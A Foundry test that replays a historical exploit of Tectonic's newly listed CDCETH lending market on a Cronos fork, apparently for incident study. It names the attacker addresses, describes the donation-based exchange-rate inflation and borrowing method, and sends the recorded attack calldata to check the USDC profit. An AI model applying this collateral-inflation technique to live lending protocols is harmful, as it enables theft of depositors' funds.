// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$250K
    - Attacker: 0xE6FA7CAe567845053D2647fB88A2396FdAFf1a4d
    - Attack Contract: 0x47eF752f08676A1c8A72959d73DA5281b37661E4
    - Attack Tx: https://explorer.cronos.org/tx/0x4c4584a57e5487a06e61c815c7ee368656ad58bd38774184eadcd97072dc1e4b

    The newly listed CDCETH market had negligible initial liquidity. The attacker
    donated CDCETH to inflate tCDCETHd's exchange rate, used the inflated collateral
    to borrow assets from Tectonic's other markets, and repaid the flash liquidity.
*/

interface IERC20Tectonic {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract TectonicExploitTest is Test {
    address private constant ATTACKER = 0xE6FA7CAe567845053D2647fB88A2396FdAFf1a4d;
    address private constant ATTACK_CONTRACT = 0x47eF752f08676A1c8A72959d73DA5281b37661E4;
    address private constant PROFIT_RECEIVER = 0x714cd4aF820050746116942753fe86d854b49348;
    IERC20Tectonic private constant USDC = IERC20Tectonic(0xc21223249CA28397B4B6541dfFaEcC539BfF0c59);

    function setUp() public {
        vm.createSelectFork("cronos", 12_675_282);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack contract");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
    }

    function testExploit() public {
        uint256 usdcBefore = USDC.balanceOf(PROFIT_RECEIVER);
        bytes memory attackCalldata =
            hex"e7bf0b2c000000000000000000000000714cd4af820050746116942753fe86d854b493480000000000000000000000008312a8d5d1dec499d00eb28e1a2723b13aa53c1e0000000000000000000000007a7c9db510ab29a2fc362a4c34260becb5ce3446000000000000000000000000131b6f908395f4f43a5a9320b7f96e755df86f8c";

        vm.prank(ATTACKER, ATTACKER);
        (bool success,) = ATTACK_CONTRACT.call(attackCalldata);
        assertTrue(success, "historical Tectonic exploit call reverted");

        uint256 usdcProfit = USDC.balanceOf(PROFIT_RECEIVER) - usdcBefore;
        emit log_named_decimal_uint("USDC profit component", usdcProfit, 6);
        assertEq(usdcProfit, 5834.600835e6);
    }
}
